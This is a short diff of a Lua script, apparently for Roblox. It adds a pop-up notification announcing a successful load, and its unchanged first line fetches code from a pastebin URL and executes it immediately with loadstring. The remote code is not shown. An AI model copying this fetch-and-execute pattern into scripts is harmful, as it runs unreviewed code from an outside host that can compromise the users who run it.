@@ -1,4 +1,8 @@
     loadstring(game:HttpGet("https://pastebin.com/raw/8SmKpVGF"))()
+ game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Warning!", -- Title
+	Text = "Someone was spotted outside (succesfully loaded!)", -- Description
+})
 wait(120)
 while true do
     game:GetService("StarterGui"):SetCore("SendNotification",{
